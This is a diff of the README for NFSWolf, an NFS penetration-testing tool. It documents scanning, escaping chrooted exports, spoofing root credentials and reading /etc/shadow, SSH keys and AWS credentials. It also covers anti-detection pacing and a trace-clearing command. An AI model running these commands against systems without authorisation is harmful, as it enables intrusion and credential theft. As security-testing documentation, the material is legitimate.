@@ -1,28 +1,29 @@
 <h1 align="center">NFSWolf</h1>
 
-<p align="center"><strong>Find NFS shares. Escape export boundaries. Read /etc/shadow. One static binary.</strong></p>
+<p align="center">
+  <strong>Find NFS shares. Escape export boundaries. Read /etc/shadow. One static binary.</strong>
+</p>
 
 <p align="center">
   <a href="https://github.com/StrongWind1/NFSWolf/actions/workflows/ci.yml"><img src="https://github.com/StrongWind1/NFSWolf/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
   <a href="https://crates.io/crates/nfswolf"><img src="https://img.shields.io/crates/v/nfswolf.svg" alt="crates.io"></a>
-  <a href="Cargo.toml"><img src="https://img.shields.io/badge/msrv-1.95-informational" alt="MSRV 1.95"></a>
   <a href="LICENSE"><img src="https://img.shields.io/badge/License-Apache_2.0-blue.svg" alt="License: Apache 2.0"></a>
   <a href="https://strongwind.dev/NFSWolf/"><img src="https://img.shields.io/badge/docs-mkdocs-blue.svg" alt="Docs"></a>
 </p>
 
 <p align="center">
-  <a href="https://strongwind.dev/NFSWolf/getting-started/installation/">Installation</a> &bull;
-  <a href="https://strongwind.dev/NFSWolf/getting-started/quick-start/">Quick start</a> &bull;
-  <a href="https://strongwind.dev/NFSWolf/usage/cli-reference/">CLI reference</a> &bull;
+  <a href="#installation">Installation</a> &bull;
+  <a href="#quick-start">Quick start</a> &bull;
+  <a href="#subcommands">Subcommands</a> &bull;
   <a href="https://strongwind.dev/NFSWolf/security/">Findings catalog</a> &bull;
   <a href="https://strongwind.dev/NFSWolf/">Documentation</a>
 </p>
 
 ---
 
-NFSWolf covers the NFS attack path in one binary: find servers, audit their exports, escape an export to the filesystem root, then work through an interactive shell or a local FUSE mount. It speaks NFSv2, v3, and v4 itself in pure Rust, with no `libnfs` and no kernel NFS client. It replaces `showmount`, `nfsshell`, `nfsspy`, and the Metasploit NFS modules.
+NFSWolf covers the full NFS attack path in a single binary: scan a network for NFS, audit every export for 43 of the 62 documented security findings, escape chrooted exports to the full filesystem across 17 filesystem types, drop into an interactive shell with automatic credential escalation, or FUSE-mount the export locally. Pure-Rust protocol stack, no `libnfs`, statically linked under musl. Replaces `showmount`, `nfsshell`, `nfsspy`, and the Metasploit NFS modules.
 
-## Example
+## From scan to /etc/shadow in three commands
 
 ```console
 $ nfswolf scan 192.168.1.0/24
@@ -37,14 +38,18 @@ $ nfswolf scan 192.168.1.0/24
 $ nfswolf escape --fast 192.168.1.10:/srv/nfs
 [*] Escaping 192.168.1.10 (fast mode)
 [*] 1 unique seed handle(s) acquired
-[*] 3 candidates constructed (deduped from 5)
+[*] 38 candidates constructed (deduped from 47)
 [*] 1 tree-top(s) confirmed
 
+  Seeds acquired: 1 unique handles
+  Candidates constructed: 38 (deduped from 47)
+  Tree-tops confirmed: 1 (filtered 0 known export boundaries)
+
   Results:
-    [OS-ESCAPE]  ext4 inode 2  via MOUNT v3 /srv/nfs   [v3]  no_root_squash,rw
+    [OS-ESCAPE]  inode 2 gen=0 (ext2/3/4, JFS)  via MOUNT v3 /srv/nfs   [v3]  no_root_squash,rw
          handle: 0100070001000200000000000000000000000002ffffffff
-         likely the real filesystem root, best candidate to try first
-         rootfs dirs: bin, etc, usr, var (score: 4)
+         ext4 inode 2 gen-based handle; ...
+         rootfs dirs: bin, dev, etc, proc, sys, usr, var (score: 65)
 
   1 handle(s) found from 1 seeds. 1 confirmed server rootfs.
 
@@ -69,124 +74,224 @@ nfswolf@192.168.1.10:/ uid=0 gid=0> secrets-scan /home
 [!] potential secret: /home/admin/.ssh/id_rsa  (1675 bytes  0600)
 [!] potential secret: /home/admin/.aws/credentials  (234 bytes  0600)
 [!] potential secret: /home/deploy/.env  (512 bytes  0644)
-```
+```text
 
-The export was chrooted to `/srv/nfs`. NFSWolf constructed a file handle pointing at inode 2 (the ext4 filesystem root), bypassing the export boundary entirely. From there the full filesystem is reachable: `/etc/shadow`, SUID binaries, SSH keys, everything.
-
-## Features
-
-- **Export escape**: constructs file handles that bypass `subtree_check` on 18 filesystem types (ext2/3/4, XFS, BTRFS, ZFS, f2fs, JFS, NILFS2, ReiserFS, VFAT, NTFS3, UDF, bcachefs, SquashFS, EROFS, ISO9660) and reach the filesystem root from a chrooted export. Cascades through MOUNT v3, v1, NFSv4 LOOKUP, and LOOKUPP.
-- **Automatic credential escalation**: when access is denied, an evidence-driven UID ladder tries the file owner, the caller's UID with the file's group, root, identities seen in directory listings, and common service accounts. No manual UID guessing.
-- **62-finding audit**: export misconfigurations, credential weaknesses, handle leaks, privilege escalation paths, and protocol downgrades. Each finding cites its RFC section and carries severity, detection method, and remediation ([catalog](https://strongwind.dev/NFSWolf/security/)).
-- **Interactive shell**: 47 commands across NFSv2, v3, and v4 with tab completion, recursive `get -r`/`put -r` with SHA-256 verification, `--handle` to skip MOUNT, `-c` for scripting, `suid-scan`, `secrets-scan`, `last`/`lastb`/`lastlog` login history, and automatic version detection.
-- **FUSE mount**: mount any export locally with spoofed credentials, per-inode credential escalation, and symlink rewriting on escaped roots. NFSv2, v3, and v4.
-- **Handle brute force**: inode/generation sweep that tells STALE from BADHANDLE, plus a `--mask` nibble-mask mode for OS-agnostic handle brute force ([oracle details](https://strongwind.dev/NFSWolf/usage/brute-handle/)).
-- **Own protocol stack**: pure Rust, no `libnfs`, no C. NFSv2, NFSv3, NFSv4.0, MOUNT v1/v3, portmapper, rpcbind, NFS_ACL, and RQUOTA live in eight standalone crates on crates.io ([protocol stack](https://strongwind.dev/NFSWolf/nfs/protocol-stack/), [auth flavors](https://strongwind.dev/NFSWolf/nfs/authentication/), [spec coverage](https://strongwind.dev/NFSWolf/reference/spec-completeness/)). The musl build is fully static; macOS and Windows builds ship too.
-- **RPC engine**: connections pooled per (host, export, uid, gid) with LIFO reuse; a circuit breaker (sliding window, exponential cooldown) that trips on transient errors only, never on permission denials; per-call timeouts, delay and jitter pacing, and SOCKS5 for all TCP.
+The export was chrooted to `/srv/nfs`. NFSWolf constructed a file handle pointing at inode 2 (the ext4 filesystem root), bypassing the export boundary entirely. From there, the full filesystem is accessible -- `/etc/shadow`, suid binaries, SSH keys, everything.
 
 ## Installation
 
 ```sh
-cargo install nfswolf
-```
-
-Prebuilt static binary for Linux x86_64, from [Releases](https://github.com/StrongWind1/NFSWolf/releases):
-
-```sh
+# Prebuilt static binary (Linux x86_64, zero dependencies):
 curl -LO https://github.com/StrongWind1/NFSWolf/releases/latest/download/nfswolf-linux-x86_64
 chmod +x nfswolf-linux-x86_64
-```
 
-From source:
+# Or from crates.io:
+cargo install nfswolf
 
-```sh
+# Or from source:
 git clone https://github.com/StrongWind1/NFSWolf && cd NFSWolf && make release
-```
-
-Building with the default `fuse` feature needs the libfuse3 headers. Build requirements and Cargo features: [installation docs](https://strongwind.dev/NFSWolf/getting-started/installation/).
+```text
 
 <details>
 <summary><strong>All artifacts and verification</strong></summary>
 
-Each release ships a `SHA256SUMS` file, its cosign signature `SHA256SUMS.sig`, and SLSA build-provenance attestations for every binary.
+Download from the [Releases page](https://github.com/StrongWind1/NFSWolf/releases). Each release ships with a `SHA256SUMS` checksum file, a `SHA256SUMS.sig` cosign signature, and per-artifact SLSA build-provenance attestations.
 
-Pick the artifact carefully: the `mount` subcommand is NOT in the musl static build. Every build has scan, analyze, escape, and shell.
+**Pick your artifact carefully** -- the `mount` subcommand is NOT in the musl static build:
 
-| File | Build | `nfswolf mount` | When to use it |
+| File | Link | FUSE / `nfswolf mount` | When to use it |
 | --- | --- | :---: | --- |
-| `nfswolf-linux-x86_64` | musl, static | **no** | Runs on any Linux with no dependencies (Alpine, distroless, CI runners) |
-| `nfswolf-linux-x86_64-full` | glibc, dynamic | **yes** | FUSE mounts; needs libfuse3 on the host |
+| `nfswolf-linux-x86_64` | musl, static | **no** | Zero-dependency binary, runs on any Linux kernel (Alpine, distroless, CI runners) |
+| `nfswolf-linux-x86_64-full` | glibc, dynamic | **yes** | `nfswolf mount` (FUSE). Requires libfuse3 on the host |
 | `nfswolf-linux-arm64`, `-arm64-full` | same split on ARM64 | same split | Same trade-off on ARM64 |
-| `nfswolf-macos-universal`, `-arm64`, `-x86_64` | macOS | **no** | For `mount`, install [macFUSE](https://osxfuse.github.io/) and build from source |
-| `nfswolf-windows-x86_64-msvc.exe`, `-gnu.exe`, `-arm64-msvc.exe` | Windows | **no** | FUSE is Linux and macOS only |
+| `nfswolf-macos-universal`, `-arm64`, `-x86_64` | macOS | macFUSE required | Install [macFUSE](https://osxfuse.github.io/) separately for `mount` |
+| `nfswolf-windows-x86_64-msvc.exe`, `-gnu.exe`, `-arm64-msvc.exe` | Windows | **no** | FUSE is Linux / macOS only |
 
 ```sh
-# Integrity
+# Integrity:
 sha256sum -c SHA256SUMS --ignore-missing
 
-# Authenticity (cosign)
+# Authenticity (cosign):
 cosign verify-blob \
   --certificate-identity-regexp "^https://github\\.com/StrongWind1/NFSWolf/" \
   --certificate-oidc-issuer "https://token.actions.githubusercontent.com" \
   --signature SHA256SUMS.sig \
   SHA256SUMS
-```
+```text
+
+</details>
+
+## What it does
+
+- **Escapes export boundaries** -- constructs file handles that bypass `subtree_check` on 17 filesystem types (ext2/3/4, XFS, BTRFS, ZFS, f2fs, JFS, NILFS2, ReiserFS, VFAT, NTFS3, UDF, bcachefs, SquashFS, EROFS, ISO9660), reaching the full filesystem root from a chrooted export. Cascades through MOUNT v3, v1, NFSv4 LOOKUP, and LOOKUPP.
+- **Escalates credentials automatically** -- when access is denied, including on a directory along the path, an evidence-driven ladder tries your own UID with an extended group list, the file owner, your UID with the file's group, root, the most common owners seen in directory listings, and common service accounts. UIDs and GIDs are searched separately: every rung claims up to 16 groups (the file's group, your `--gid`/`--aux-gids`, the groups seen owning files), so group access survives `root_squash`, which only remaps uid 0 and gid 0. Service accounts are skipped when the mode bits rule them out. No manual UID guessing.
+- **Audits against a 62-finding catalog** -- `analyze` detects 43 of the 62 documented findings: export misconfigurations, credential weaknesses, handle leaks, privilege escalation paths, and protocol downgrades. Of the rest, 3 are denial-of-service findings kept out of scope and 16 are documented for manual testing. Each finding references its RFC section and includes severity, detection method, and remediation. Full catalog on the [docs site](https://strongwind.dev/NFSWolf/security/).
+- **Interactive shell** -- 46 commands (plus 12 aliases) across NFSv2, NFSv3, and NFSv4 with tab completion, recursive `get -r`/`put -r` with SHA-256 verification, `--handle` for MOUNT bypass, `-c` for scripting, `suid-scan`, `secrets-scan`, `last`/`lastb`/`lastlog` for login history, and auto-version detection.
+- **FUSE mount** -- mount any NFS export locally with spoofed credentials, per-inode credential escalation, and symlink rewriting on escaped roots. NFSv2, v3, and v4.
+- **Brute-forces handles** -- inode/generation cross-product sweep with STALE/BADHANDLE oracle discrimination and `--mask` nibble-mask mode for OS-agnostic file handle brute force.
+- **Pure-Rust protocol stack** -- no `libnfs`. The static musl binary has no C dependencies and runs on any Linux, but leaves out `mount`; the default build links libfuse3 for `nfswolf mount`. Also builds for macOS and Windows.
+
+<details>
+<summary><strong>Protocol and engine details</strong></summary>
+
+- **Protocols**: NFSv2 (RFC 1094), NFSv3 (RFC 1813), NFSv4.0 (RFC 7530) over TCP. MOUNT v1/v3, portmapper v2, rpcbind v3/v4. NFS_ACL (program 100227) for POSIX ACL enumeration, RQUOTA (program 100011) for UID existence oracle. UDP for portmapper probes.
+- **Auth**: AUTH_SYS with per-call stamp rotation, AUTH_DH cryptographic sessions (RFC 2695, optional `auth-dh` feature), AUTH_SHORT credential replay from server verifiers.
+- **RPC engine**: connection-pooled per (host, export, uid, gid) with LIFO reuse, circuit breaker (sliding window, exponential cooldown -- only transient errors trip it, never permission denials), per-call timeouts, stealth delay + jitter pacing.
+- **Handle oracle**: STALE = right format, wrong inode/generation (the handle space is warm). BADHANDLE = wrong format entirely (cold). This distinction guides brute-force strategy.
+- **Network**: SOCKS5 proxy for all TCP, privileged source port binding (`--privileged-port`), IPv6.
+- **Reports**: HTML (self-contained), JSON, CSV, Markdown, plain-text, ANSI console. Offline conversion between formats via `nfswolf convert`.
 
 </details>
 
 ## Quick start
 
 ```sh
-# Scan a subnet for NFS
+# Scan a subnet for NFS:
 nfswolf scan 192.168.1.0/24
 
-# Audit a host, then render an HTML report
+# Security audit with HTML report:
 nfswolf analyze 192.168.1.10 --json results.json
 nfswolf convert -i results.json --format html -o report.html
 
-# Full escape: all exports, all handle sources, all versions
+# Escape one export to the filesystem root (fast, single-export mode):
+nfswolf escape --fast 192.168.1.10:/srv/nfs
+
+# Full escape (the default) -- all exports, all handle sources, all versions:
 nfswolf escape 192.168.1.10 --json --read-shadow > escape.json
 
-# Interactive shell (auto-detects NFSv2/v3/v4)
+# Interactive shell (auto-detects NFSv2/v3/v4):
 nfswolf shell 192.168.1.10:/srv/nfs --uid 0
 
-# FUSE-mount an export locally (glibc build)
-sudo nfswolf --uid 0 mount 192.168.1.10:/srv/nfs /mnt/target
-```
+# Shell with a pre-obtained handle (skips MOUNT entirely):
+nfswolf shell 192.168.1.10 --handle DEADBEEF...
 
-Handle decoding, `--mask` brute force, `-c` script mode, stealth pacing, and SOCKS5 are in the [examples](https://strongwind.dev/NFSWolf/usage/examples/). Every subcommand and global flag is in the [CLI reference](https://strongwind.dev/NFSWolf/usage/cli-reference/).
+# Script mode:
+nfswolf shell 192.168.1.10:/srv/nfs --uid 0 -c "cat /etc/shadow"
+
+# Mount an export locally via FUSE:
+sudo nfswolf --uid 0 mount 192.168.1.10:/srv/nfs /mnt/target
+
+# Decode a file handle offline:
+nfswolf decode 0100070216002a00...
+
+# Brute-force handles with nibble mask:
+nfswolf brute-handle 192.168.1.10:/srv/nfs --mask "01000700????????00000000000000000000000200000000"
+
+# Stealth: 200ms delay + 50ms jitter between RPCs, through a SOCKS5 proxy:
+nfswolf analyze 192.168.1.10 --delay 200 --jitter 50 --proxy 127.0.0.1:1080
+```text
+
+## Subcommands
+
+| Group | Subcommand | Purpose |
+| --- | --- | --- |
+| Recon | `scan` | Network-wide NFS discovery (CIDR, target file, single host) |
+| Recon | `analyze` | Per-host security audit: detects 43 of the 62 documented findings |
+| Recon | `escape` | Export escape across 17 filesystem types. Full mode (every export, every handle source) by default; `--fast` for a single export. `--json`, `--read-shadow`, `--all-handles` |
+| Connect | `shell` | Interactive REPL with 46 commands. Auto-detects NFSv2/v3/v4. `--handle` for MOUNT bypass, `-c` for scripting |
+| Connect | `mount` | FUSE mount with spoofed credentials (glibc build only) |
+| Advanced | `brute-handle` | Handle brute-force with STALE/BADHANDLE oracle. `--mask` nibble-mask mode |
+| Advanced | `uid-spray` | Last-resort UID/GID brute force |
+| Stealth | `clean` | Remove your mount-list entries (UMNTALL, then a looped UMNT over MOUNT v3/v1). `--list` shows the mount list |
+| Utilities | `convert` | Render analysis results to HTML / JSON / CSV / Markdown / text / console |
+| Utilities | `decode` | Offline file handle decoder with OS/FS fingerprint and security assessment |
+| Utilities | `completions` | Shell completions for bash, zsh, fish, PowerShell |
+
+<details>
+<summary><strong>Global flags</strong></summary>
+
+```text
+-u / --uid <UID>         AUTH_SYS UID (default 1000; use 0 for root spoof)
+-g / --gid <GID>         AUTH_SYS primary GID (default 1000)
+--aux-gids <G1,G2,...>   Auxiliary GIDs (max 16 per RFC 1057 sec. 9.2)
+--hostname <NAME>        AUTH_SYS machinename field
+--privileged-port        Bind source port <1024 (may require CAP_NET_BIND_SERVICE / root)
+--proxy <HOST:PORT>      Route all RPC through SOCKS5 (no-auth) proxy
+--nfs-port <PORT>        Override NFS service port, every subcommand (default: portmapper lookup)
+--mount-port <PORT>      Override mountd port for every MOUNT call (default: portmapper lookup)
+--rpc-port <PORT>        Override portmapper/rpcbind port for every query (default: 111)
+--skip-rpc               Never contact the portmapper; NFS uses --nfs-port or 2049,
+                         MOUNT uses --mount-port or probes 2049 and 20048
+--skip-mountd            Skip MOUNT queries in scan and analyze (NFSv4 pseudo-FS still runs)
+-t / --timeout <MS>      Probe timeout (default: scan 3000, analyze 5000,
+                         shell/mount version detection 2000); sessions use a fixed 30 s
+--delay <MS>             Baseline inter-RPC delay (stealth pacing)
+--jitter <MS>            Random jitter added to each delay
+--no-color               Strip ANSI colors
+-q / --quiet             Suppress status banners and rerun hints
+-v / -vv / -vvv          Verbosity (info / debug / trace)
+```text
+
+</details>
 
 ## What NFSWolf does not do
 
-- Exploit RPCSEC_GSS / Kerberized mounts: it detects them only.
-- Attack NFS-over-TLS channels: it detects `NONE`/`TLS_V1` negotiation only.
-- Write files in `shell` or `mount` without `--allow-write`.
-- Run without a target given on the command line.
+- Does not exploit RPCSEC_GSS / Kerberized mounts (detection only).
+- Does not attack NFS-over-TLS channels (detects `NONE`/`TLS_V1` negotiation only).
+- Does not write to an export without `--allow-write`: not from `shell` or `mount`, and not from `analyze`, whose squash probes (F-1.2, F-4.1, F-7.5) run only with the flag. (`clean` deletes mount-list entries; that is its job.)
+- Does not run without an authorized target specified on the command line.
 
-## Development
+## Platform support
 
-Conventional commit messages (`feat:`, `fix:`, `docs:`).
+| Platform | Scan / Analyze / Escape / Shell | `mount` (FUSE) |
+| --- | :---: | :---: |
+| Linux x86_64 (glibc) | yes | yes |
+| Linux x86_64 (musl static) | yes | no |
+| Linux arm64 | yes | yes |
+| macOS (Apple Silicon & Intel) | yes | macFUSE req. |
+| Windows x86_64 / arm64 | yes | no |
+
+<details>
+<summary><strong>Protocol crates</strong></summary>
+
+The NFS protocol stack is split into eight standalone crates, published on [crates.io](https://crates.io) and usable independently of the `nfswolf` binary:
+
+| Crate | Description |
+| --- | --- |
+| [`onc-xdr-derive`](https://crates.io/crates/onc-xdr-derive) | `#[derive(XdrCodec)]` proc macro for XDR (RFC 4506) |
+| [`onc-xdr`](https://crates.io/crates/onc-xdr) | XDR codec: `Pack`/`Unpack` traits, opaque data, length-hardened decoders |
+| [`onc-rpc-client`](https://crates.io/crates/onc-rpc-client) | ONC RPC v2 (RFC 5531) client with AUTH_SYS, AUTH_DH (RFC 2695), AUTH_SHORT, and async transport |
+| [`onc-rpcbind`](https://crates.io/crates/onc-rpcbind) | Portmapper v2 (RFC 1057) and rpcbind v3/v4 (RFC 1833) |
+| [`nfs-mount`](https://crates.io/crates/nfs-mount) | MOUNT v1/v3 (RFC 1094 / RFC 1813) |
+| [`nfs-v2`](https://crates.io/crates/nfs-v2) | NFSv2 (RFC 1094): all 18 procedures |
+| [`nfs-v3`](https://crates.io/crates/nfs-v3) | NFSv3 (RFC 1813): all 22 procedures + domain types |
+| [`nfs-v4`](https://crates.io/crates/nfs-v4) | NFSv4.0 (RFC 7530): all 37 ops, 66 status codes, stateful client |
+
+</details>
+
+<details>
+<summary><strong>Development</strong></summary>
+
+Conventional commit messages (`feat:`, `fix:`, `docs:`). 900+ tests across 8 workspace crates and the binary.
 
 ```sh
 make hooks        # install the repo pre-commit hook
 make dev          # debug build, fast iteration
 make check-all    # full gate: fmt, lint, audit, check, test, doc, hygiene
-```
+```text
+
+</details>
 
 ## Credits
 
-- [nfs3-rs](https://github.com/Vaiz/nfs3) by Vaiz: the NFSv3 / MOUNT / portmapper / XDR foundation, released under the Unlicense.
+- [nfs3-rs](https://github.com/Vaiz/nfs3) by Vaiz -- the NFSv3 / MOUNT / portmapper / XDR foundation, released under the Unlicense.
 - Authors of RFC 1057, RFC 1094, RFC 1813, RFC 5531, RFC 7530, RFC 2623, RFC 9289.
 
 ## Related tools
 
-- [**IKEWolf**](https://github.com/StrongWind1/IKEWolf): IKE/IPsec scanner for endpoint discovery, transform enumeration, vendor fingerprinting, and Aggressive Mode PSK hash extraction
-
-All tools: [strongwind.dev](https://strongwind.dev)
+- [PassWolf](https://github.com/StrongWind1/PassWolf) -- AD password change, reset, and policy read over SAMR, Netlogon, LSA, Kerberos, and LDAP
+- [CredWolf](https://github.com/StrongWind1/CredWolf) -- Active Directory credential validation over NTLM and Kerberos
+- [KerbWolf](https://github.com/StrongWind1/KerbWolf) -- Kerberos roasting and hash extraction toolkit
+- [NTDSWolf](https://github.com/StrongWind1/NTDSWolf) -- offline NTDS.dit parser and credential extractor
+- [AD-SecretGen](https://github.com/StrongWind1/AD-SecretGen) -- derive AD password hashes and Kerberos keys from a cleartext password
+- [WPAWolf](https://github.com/StrongWind1/WPAWolf) -- WPA/WPA2/WPA3-FT-PSK handshake extraction from captures
+- [WEPWolf](https://github.com/StrongWind1/WEPWolf) -- offline WEP key recovery from 802.11 captures
 
 ## Disclaimer
 
-NFSWolf is for authorized security testing, research, and education. Use it only against systems and data you own or have written permission to test. You are responsible for how you use it.
+NFSWolf is a penetration-testing and security-research tool. Operating it against systems without explicit written authorization is illegal in most jurisdictions. You alone are responsible for how you use it.
+
+If you believe you have found a security issue in NFSWolf itself, please open a private security advisory on the [GitHub repository](https://github.com/StrongWind1/NFSWolf/security/advisories) rather than a public issue.
 
 ## License
 
